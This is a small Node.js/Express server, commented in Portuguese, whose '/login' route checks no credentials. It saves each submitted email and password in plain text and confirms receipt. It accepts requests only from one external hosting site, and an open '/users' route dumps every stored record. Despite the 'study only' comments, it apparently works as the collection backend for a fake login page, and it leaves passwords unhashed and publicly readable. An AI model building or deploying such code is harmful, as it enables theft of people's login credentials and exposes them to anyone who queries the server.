require('dotenv').config();
const express = require('express');
const cors = require('cors');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuração do CORS
app.use(cors({
  origin: 'https://lime-wildcat-293255.hostingersite.com'
}));

app.use(express.json());

// Rota para receber os dados do formulário
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email e senha são obrigatórios' });
  }

  try {
    // Insere os dados no banco (em texto puro - APENAS PARA ESTUDO)
    await db.query(
      'INSERT INTO users (email, password) VALUES ($1, $2)',
      [email, password]
    );
    
    res.status(200).json({ message: 'Dados recebidos com sucesso!' });
  } catch (error) {
    console.error('Erro no banco de dados:', error);
    res.status(500).json({ error: 'Erro ao salvar os dados' });
  }
});

// Rota para visualizar todos os registros (APENAS PARA TESTE)
app.get('/users', async (req, res) => {
  try {
    const result = await db.query('SELECT * FROM users');
    res.json(result.rows);
  } catch (error) {
    console.error('Erro ao buscar usuários:', error);
    res.status(500).json({ error: 'Erro no servidor' });
  }
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});